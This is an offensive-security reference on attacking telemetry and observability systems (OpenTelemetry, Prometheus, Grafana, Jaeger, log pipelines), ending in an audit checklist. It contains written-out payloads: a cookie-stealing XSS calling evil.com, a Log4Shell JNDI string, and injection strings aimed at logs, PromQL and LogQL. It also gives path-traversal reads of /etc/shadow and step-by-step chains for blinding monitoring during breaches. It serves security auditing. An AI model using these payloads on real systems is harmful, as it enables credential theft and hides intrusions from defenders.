# Observability & Telemetry Attacks Reference

## Telemetry Data Poisoning

### Trace/Metric Injection to Mask Attacks
- Flood telemetry backend with high-volume noise traces during active breach — legitimate attack traces buried in volume
- Inject false success metrics to suppress anomaly-based alerting (e.g., push `http_requests_total{status="200"}` to mask spike in `500`s)
- Create decoy traces with benign-looking span names to dilute search results during incident response
- Metric value manipulation: push counter resets or gauge values that normalize anomalous patterns

**Root cause:** Telemetry pipelines trust data from any instrumented source without integrity verification. No signing or provenance on metric/trace data.

**Impact:** Monitoring blind spot during active compromise. SOC sees clean dashboards while attacker operates freely.

### Cardinality Bomb Attacks
- Inject high-cardinality attributes into metrics: user IDs, session tokens, request IDs, UUIDs as label values
- Each unique label combination creates a new time series — `http_requests_total{user_id="..."}` with 1M users = 1M time series
- Backend (Prometheus, Mimir, Cortex, VictoriaMetrics) runs OOM or hits series limit → metrics ingestion stops entirely
- Targeted variant: bomb a single critical metric (e.g., error rate) so that specific alert rule becomes non-functional

**Exploitation chain:**
1. Identify exposed Pushgateway, OTLP receiver, or StatsD endpoint
2. Push metrics with randomized high-cardinality labels at sustained rate
3. Backend memory grows unbounded → OOM kill or ingestion rejection
4. All monitoring for the affected tenant/namespace goes dark
5. Execute primary attack during monitoring blackout

**Detection:** Monitor `prometheus_tsdb_head_series` or equivalent cardinality metric. Alert on sudden cardinality growth rate.

### Span Attribute Injection (Stored XSS via Telemetry)
- Attacker-controlled data flows into span names, attribute values, or resource attributes
- Trace backends (Jaeger, Zipkin, Grafana Tempo) render these in web UIs without sanitization
- Set `http.url` attribute to `<script>document.location='https://evil.com/?c='+document.cookie</script>`
- Set service name to XSS payload — renders in service topology maps, search results, trace detail views
- Metric label values containing HTML/JS rendered in Grafana panels

**Key properties:**
- Stored XSS — payload persists in trace storage, triggers on every view
- Targets SRE/DevOps users with elevated access to infrastructure dashboards
- Cookie theft from Grafana/Jaeger sessions gives attacker access to all monitored infrastructure
- Service name injection affects every trace from that service — wide blast radius

### Log Injection
- Newline injection (`\n`, `\r\n`) in log messages creates fake log entries: `user=admin\n[INFO] Authentication successful for admin`
- ANSI escape sequence injection in terminal-rendered logs — overwrite previous lines, hide malicious entries
- JSON log injection: break out of JSON string value to add new fields: `value","admin":true,"x":"` in structured logging
- Log timestamp manipulation to confuse timeline reconstruction during incident response
- Unicode bidirectional override characters (`U+202E`, `U+2066`) in log messages — log line reads differently in terminal vs log viewer

**Root cause:** Log frameworks interpolate user input into log messages without escaping format-specific characters.

### Trace Context Spoofing
- Forge W3C `traceparent` header (`00-<trace-id>-<span-id>-01`) to link malicious requests to legitimate trace trees
- Inject `tracestate` header with vendor-specific fields to manipulate sampling decisions or routing
- Spoof `baggage` header to inject key-value pairs propagated across all downstream services
- Clone a valid `trace-id` from a legitimate request → attacker's requests appear as part of normal transaction flow

**Exploitation chain:**
1. Capture valid `traceparent` from any response header or client-side instrumentation
2. Reuse `trace-id` with new `span-id` on malicious requests
3. Attack traffic appears as child spans of legitimate traces — blends into normal trace trees
4. Incident responders filtering by trace ID see attacker operations mixed with legitimate ones

---

## Collector as Attack Surface

### Unauthenticated OTLP Receivers
- OTLP gRPC (default `:4317`) and HTTP (default `:4318`) receivers accept data from any source by default
- No authentication, no mTLS, no API key required in default OpenTelemetry Collector configuration
- Any network-adjacent attacker can push arbitrary telemetry data
- Kubernetes deployments often expose collector as `ClusterIP` service — any compromised pod can inject telemetry

**Source audit targets:**
- `receivers.otlp.protocols.grpc.endpoint` and `receivers.otlp.protocols.http.endpoint` in collector config
- Missing `auth` extension in receiver configuration
- Network policies not restricting access to collector ports

### Collector SSRF via Exporter Configuration
- Exporter `endpoint` URL pointing to internal services: `otlp/grpc://metadata.google.internal:80`
- `prometheus` exporter with remote write URL targeting internal endpoints
- `zipkin` exporter URL manipulated to reach internal APIs
- If collector config is loaded from external source (ConfigMap, Consul, Vault), config injection → SSRF via exporter endpoint

**Root cause:** Collector makes outbound connections to configured exporter endpoints. If config is attacker-influenced, collector becomes an SSRF proxy inside the trusted network.

### Collector RCE via Config Injection
- Dynamic config generation from user input (e.g., tenant-specific collector configs built from API parameters)
- YAML injection in collector config: inject `processors`, `extensions`, or `exporters` blocks
- `exec` connector or custom processor with shell command execution
- Collector extensions with code execution capability (`basicauth` with external script, custom extensions)

**Exploitation chain:**
1. Find config generation endpoint or template
2. Inject YAML to add `filelog` receiver reading `/etc/shadow` or exporter sending data to attacker endpoint
3. Collector reloads config (hot reload enabled by default) → new pipeline active
4. Sensitive data flows to attacker-controlled exporter

### Filelog Receiver Path Traversal
- `filelog` receiver configured with user-influenced `include` paths
- Read arbitrary files: `include: ["/etc/passwd"]`, `include: ["/proc/*/environ"]`
- Glob patterns with path traversal: `include: ["/var/log/../../etc/shadow"]`
- Combined with exporter → file content sent to telemetry backend, readable via trace/log queries

### Prometheus Receiver Scraping Internal Endpoints
- `prometheus` receiver with `scrape_configs` targeting internal services
- Service discovery (Kubernetes SD, DNS SD, Consul SD) enumerates internal infrastructure
- Scrape targets expose `/metrics` with internal state, version info, connection strings
- Custom metrics endpoints may expose business data, user counts, feature flags

### Debug Endpoint Information Disclosure
- `zpages` extension exposes internal pipeline state at `/debug/tracez`, `/debug/rpcz`, `/debug/pipelinez`
- `pprof` extension exposes Go profiling data — goroutine dumps, heap profiles, CPU profiles
- Health check endpoint (`/`) returns collector version, enabled components, pipeline topology
- `memory_ballast` extension debug info leaks memory configuration

**Impact:** Internal architecture disclosure — component versions, pipeline topology, exporter endpoints (including credentials in URLs), configured processors revealing security controls.

---

## SDK Supply Chain Attacks

### Dependency Confusion
- npm: `@opentelemetry/api` vs `opentelemetry-api` (no scope) — typosquat on unscoped name
- PyPI: `opentelemetry-api` vs `opentelemetry_api` vs `otel-api` — naming variations
- Maven: `io.opentelemetry:opentelemetry-api` vs typosquat on different `groupId`
- Auto-instrumentation packages with broad hooks are high-value targets: `@opentelemetry/auto-instrumentations-node` wraps every HTTP/DB call

### Compromised Auto-Instrumentation
- Auto-instrumentation monkey-patches all HTTP clients, database drivers, message queue clients
- If compromised: captures every outbound HTTP request (including auth headers), every database query (including credentials in connection strings), every message payload
- Node.js `require-in-the-middle` hook intercepts all `require()` calls — a compromised instrumentation library has full `require()` interception
- Java agent (`-javaagent:opentelemetry-javaagent.jar`) runs with full application permissions — compromised agent = full RCE
- Python `opentelemetry-instrument` command wraps the entire application process

**Impact:** Supply chain compromise of a single OTel instrumentation library gives attacker passive interception of all application I/O.

### Environment Variable Hijacking
- `OTEL_EXPORTER_OTLP_ENDPOINT` — redirect all telemetry to attacker-controlled collector
- `OTEL_EXPORTER_OTLP_HEADERS` — inject auth headers that attacker's endpoint captures
- `OTEL_TRACES_SAMPLER=always_on` — override sampling to capture 100% of traces (exfiltrate all request data)
- `OTEL_TRACES_SAMPLER=always_off` — disable all tracing (monitoring blind spot)
- `OTEL_LOG_LEVEL=debug` — verbose SDK logging may dump sensitive data to stderr/stdout
- `OTEL_RESOURCE_ATTRIBUTES` — inject resource attributes that affect routing, tenant isolation, or access control in multi-tenant backends

**Root cause:** OTel SDKs read configuration from environment variables with no integrity verification. Container escape, CI/CD injection, or `.env` file write gives full telemetry control.

---

## Data Exfiltration via Telemetry

### Sensitive Data in Span Attributes
- `http.url` / `url.full` — query parameters containing API keys, tokens, session IDs
- `db.statement` — full SQL queries including `WHERE email='user@example.com'`
- `db.connection_string` — database credentials in connection strings
- `http.request.header.authorization` — Bearer tokens, Basic auth credentials
- `http.request.body` / `http.response.body` — full request/response payloads if body capture enabled
- `rpc.grpc.request.metadata` — gRPC metadata containing auth tokens
- `messaging.message.payload` — message queue payloads with business data

### Resource Detector Data Leakage
- Cloud resource detectors capture: instance ID, region, account ID, VPC ID, security groups
- Kubernetes resource detector: namespace, pod name, node name, container image, service account
- Process resource detector: `process.command_line` (may include secrets passed as CLI args), `process.owner`, PID
- Host resource detector: hostname, OS version, kernel version — useful for targeted exploitation
- `OTEL_RESOURCE_ATTRIBUTES` may contain manually-set secrets: `service.api_key=sk-...`

### Exfiltration Channel Construction
- Attacker with code execution creates custom spans with stolen data in attributes
- Data encoded in span names, attribute keys, or attribute values — blends with normal telemetry
- Telemetry exported via standard OTLP to attacker-controlled endpoint (set via env var)
- Even with legitimate endpoint: attacker queries trace backend to retrieve exfiltrated data from span attributes

**Impact:** Telemetry pipelines become a covert exfiltration channel — data leaves through an approved, monitored, and firewall-allowed path (the telemetry export endpoint).

### IPC-args Verbatim Logging

**IPC-args verbatim logging**: desktop wrappers (Tauri, Electron) often instrument IPC with `logger.info("calling <cmd>", args)` or `logger.debug("response", result)`. Because the arg tuple is the native-to-renderer boundary, it carries pickle keys, passphrases, decrypted events, OIDC codes, and recovery secrets. The scrubber never sees structured argument names; it sees the serialized string. Flag every `logger.*(..., ...args)` / `logger.*(label, obj)` where the second positional is not a whitelisted string constant.

---

## Silent Telemetry Failures as Attack Surface

### SDK Initialization Order Exploitation
- OTel SDK must initialize BEFORE application imports to patch libraries — `--require @opentelemetry/auto-instrumentations-node`
- If SDK initializes AFTER `http`, `pg`, `mysql2` are imported: those libraries are NOT instrumented
- Attacker manipulates import order (dependency injection, module load hooks) to prevent instrumentation of specific libraries
- Result: specific outbound calls (e.g., to C2 server) produce no spans — invisible to tracing

### Batch Processor Queue Overflow
- `BatchSpanProcessor` has configurable `maxQueueSize` (default: 2048) and `maxExportBatchSize` (default: 512)
- When queue is full: new spans are silently dropped — no error, no log, no metric
- Targeted flood: generate high-volume spans to fill queue, then execute attack — attack spans dropped
- `scheduledDelayMillis` (default: 5000ms) means 5-second window where spans accumulate — burst attack within window exceeds queue

**Exploitation chain:**
1. Determine target application's batch processor configuration (defaults are public knowledge)
2. Generate > 2048 concurrent spans (trivial with parallel HTTP requests)
3. Queue fills → subsequent spans dropped silently
4. Execute actual attack during drop window — no trace record created

### Memory Limiter Processor Exploitation
- Collector `memory_limiter` processor drops data when memory threshold exceeded
- Attacker floods collector with large spans/metrics → memory limit hit → all data dropped including legitimate telemetry
- Configurable `check_interval` creates periodic windows where limit isn't enforced
- `spike_limit_mib` allows short bursts above soft limit — time attack to burst window

### Exporter Misconfiguration (Zero Telemetry, Zero Errors)
- gRPC exporter pointing to HTTP endpoint (or vice versa): connection fails silently, SDK retries with backoff, eventually gives up
- Wrong port: `localhost:4317` vs `localhost:4318` (gRPC vs HTTP) — common misconfiguration, no telemetry exported
- TLS mismatch: exporter configured for plaintext, collector expects TLS — silent connection failure
- DNS resolution failure for exporter endpoint: SDK logs warning (if logging enabled), continues without telemetry

**Key properties:** Default SDK behavior is fire-and-forget — export failures don't crash the application, don't raise exceptions, and are only visible in SDK debug logs (disabled by default). Application appears healthy while completely unmonitored.

### ForceFlush and Shutdown Race
- `TracerProvider.forceFlush()` not called on application shutdown → final batch of spans lost
- Serverless (Lambda, Cloud Functions): function terminates before async export completes → last invocation's spans lost
- Container SIGTERM → application starts shutdown → pending spans in batch processor never exported
- Attack timed to application restart/deployment window: traces from attack period never reach backend

### Sampler Configuration Exploitation
- Head-based sampling (`TraceIdRatioBased(0.01)`) drops 99% of traces — attacker's traces statistically invisible
- `ParentBased` sampler inherits parent decision: if attacker forges `traceparent` with `sampled=0` flag, entire downstream trace tree is not sampled
- Custom sampler overridden via `OTEL_TRACES_SAMPLER` env var — set to `always_off` to disable all tracing

---

## Backend & Dashboard Attacks

### Grafana Vulnerabilities
- SSRF via data source proxy: `/api/datasources/proxy/:id/*` — Grafana proxies requests to configured data sources, path traversal reaches internal endpoints
- Plugin RCE: Grafana plugins execute server-side (Go plugins via HashiCorp go-plugin, or backend data source plugins) — malicious plugin = RCE
- Stored XSS in dashboard panels: metric names, label values, annotation text rendered without sanitization in certain panel types
- Dashboard JSON injection: exported dashboard JSON imported by another user — embedded script in panel titles, descriptions
- API key leakage: Grafana API keys in dashboard JSON exports, provisioning configs, or Terraform state
- CVE-2021-43798: path traversal in Grafana plugin routes — `/public/plugins/<plugin-id>/../../../../etc/passwd`

### PromQL Injection
- User-controlled label matchers: `http_requests_total{job="$user_input"}` — inject `"}` to break out of label matcher
- Regex label matcher injection: `{job=~"$input"}` — inject `.*"}` or `"} or vector(1) #` to manipulate query
- `label_replace()` / `label_join()` with attacker-controlled parameters
- Subquery injection in range vector selectors

**Root cause:** PromQL queries constructed via string concatenation with user input, common in multi-tenant Grafana dashboards with template variables.

### Jaeger Query Injection
- Trace ID search with crafted IDs targeting backend-specific query syntax (Elasticsearch, Cassandra, BadgerDB)
- Tag-based search: `http.url=<injected_value>` → Elasticsearch query string injection if tags are queried via Elasticsearch Query DSL
- Service name dropdown populated from span data — XSS via malicious service names

### Alertmanager Template Injection
- Go `text/template` execution in alert notification templates
- Template functions available: `toUpper`, `toJSON`, `match`, `reReplaceAll`, `safeHtml` — `safeHtml` marks content as safe, disabling escaping
- Attacker-controlled alert label/annotation values rendered through templates: `{{ .Labels.instance }}` where instance is attacker-set
- Webhook receiver templates with attacker-controlled fields → SSRF via webhook URL template

---

## Log Pipeline Attacks

### Log4Shell-Style via Structured Logging
- JNDI lookup strings in any field that reaches Log4j: span attributes, trace context, baggage values
- OTel Java auto-instrumentation captures HTTP headers → headers logged → `${jndi:ldap://evil.com/a}` in `User-Agent` reaches Log4j
- Structured logging frameworks (Logback, SLF4J) with pattern layouts performing lookups on interpolated values
- Python `logging` with `extra` fields from OTel context — format string injection if using `%`-style formatting

### Log Aggregator Injection
- **Elasticsearch:** JSON injection in log fields → manipulate `_index`, `_type`, or inject `script` fields for Painless script execution
- **Loki:** LogQL injection via label values: `{job="$input"}` — inject `"} |= "" | line_format "{{.exfiltrated_data}}" #`
- **Splunk:** SPL injection via user-controlled fields in saved searches or dashboards

### Log File Path Traversal
- Filebeat `paths` configuration with user-influenced values: `/var/log/../../etc/shadow`
- Fluentd `<source>` path configuration with glob patterns that escape intended directories
- Syslog file output path injection: manipulated syslog facility/severity routes to unintended file path
- Vector (Timber.io) `file` source with configurable `include` paths

### Syslog Injection
- RFC 5424 structured data injection: `[exampleSDID@32473 iut="3" eventSource="Application" eventID="1011"][injected@1 key="value"]`
- Priority value manipulation: change `<134>` (informational) to `<8>` (emergency) to trigger high-priority alerting
- Hostname/app-name spoofing in syslog header — logs attributed to wrong source
- Message injection via newlines in MSG part — create fake syslog entries

### Log-Based Alerting Bypass
- Understand detection rule regex patterns (often published in SIEM rule repos) and craft log entries that don't match
- Inject log entries that match "resolved" patterns to auto-close alerts
- Rate-limit abuse: generate enough false-positive alerts to trigger suppression rules, then attack during suppression window
- Timestamp manipulation: set log timestamp to future/past to fall outside alerting time windows

---

## Prometheus & Metrics-Specific Attacks

### Scrape Target SSRF
- Prometheus `scrape_configs` with attacker-controlled `targets` — Prometheus makes HTTP GET to any specified endpoint
- `relabel_configs` with `replacement` targeting internal URLs
- `metrics_path` manipulation: set to `/api/v1/admin/tsdb/delete_series` to trigger destructive admin actions via GET
- File-based service discovery (`file_sd_configs`) — write to discovery file to add malicious scrape targets

**Exploitation chain:**
1. Gain write access to Prometheus configuration or file-based SD targets
2. Add scrape target pointing to internal service: `targets: ["metadata.google.internal"]`
3. Prometheus scrapes target at configured interval — acts as automated SSRF
4. Response body not captured, but response time / up metric confirms reachability (blind SSRF)

### Pushgateway Abuse
- Default Pushgateway deployment: no authentication, accepts metrics from any source
- Push arbitrary metrics to manipulate dashboards and alerts
- Push metrics with label values matching existing jobs — overwrite legitimate metrics
- Delete metrics via `DELETE /metrics/job/<job>` — remove evidence of compromise
- Pushgateway metrics persist until explicitly deleted — long-lived poisoned data

### Recording Rule Injection
- Recording rules generated from user input (multi-tenant platforms allowing custom recording rules)
- PromQL in recording rules can access any metric in the Prometheus instance — cross-tenant data access
- `expr` field with crafted PromQL: `group_left` join to exfiltrate labels from other tenants' metrics
- Rule evaluation interval creates periodic query execution — persistent access

### Federation Endpoint Data Exfiltration
- `/federate` endpoint exposes metrics matching provided selectors — `match[]={__name__=~".+"}` returns all metrics
- Often less protected than main query API — intended for server-to-server use
- Cross-cluster federation with compromised federation consumer — attacker's Prometheus scrapes victim's `/federate`
- No per-metric access control — federation is all-or-nothing for matched selectors

### Service Discovery Exploitation
- **Kubernetes SD:** enumerate all services, pods, endpoints, ingresses — full cluster service map
- **DNS SD:** enumerate internal service names via SRV/A record queries
- **Consul SD:** query Consul catalog for all registered services, health checks, metadata
- **EC2 SD:** enumerate EC2 instances with tags, IPs, security groups
- Service discovery metadata exposed as metric labels — internal infrastructure details in `/metrics` output

---

## Detection & Audit Patterns

### Authentication & Access Control
- Verify OTLP receiver endpoints require mTLS or bearer token authentication
- Check Pushgateway, federation, and admin API endpoints for authentication
- Audit collector config for `auth` extension usage on all receivers
- Verify network policies restrict collector port access to known instrumented services
- Check Grafana/Jaeger RBAC configuration — default admin credentials, API key rotation

### Configuration Audit
- Scan collector configs for `filelog` receiver with overly broad `include` paths
- Check exporter endpoints for internal/metadata URLs (SSRF)
- Verify `zpages`, `pprof`, and health check extensions are not publicly exposed
- Audit environment variables for hardcoded credentials in `OTEL_EXPORTER_OTLP_HEADERS`
- Review `scrape_configs` for user-influenced target URLs or paths

### Data Leakage Audit
- Sample span attributes for PII: email addresses, auth tokens, credit card numbers
- Check `db.statement` attributes for credential exposure in connection strings
- Verify `http.request.header.*` attributes exclude `authorization`, `cookie`, `x-api-key`
- Audit resource detector configuration — disable `process.command_line` capture
- Review custom span attributes for business-sensitive data

### Pipeline Resilience
- Monitor telemetry pipeline health metrics: `otelcol_exporter_sent_spans`, `otelcol_processor_dropped_spans`
- Alert on `otelcol_processor_dropped_spans > 0` — indicates data loss (potentially attacker-induced)
- Verify batch processor queue sizes are monitored and alerted
- Test pipeline behavior under load — confirm graceful degradation vs silent data loss
- Verify `ForceFlush` is called on application shutdown paths
- Monitor cardinality growth rate in metrics backends — sudden spikes indicate cardinality bomb

### Supply Chain
- Pin OTel SDK versions — avoid `latest` or `^` ranges
- Verify package names match official OpenTelemetry organization (npm `@opentelemetry/*`, PyPI `opentelemetry-*`)
- Audit auto-instrumentation library list — remove instrumentations for unused libraries
- Monitor for new OTel CVEs — SDK vulnerabilities affect all instrumented applications simultaneously
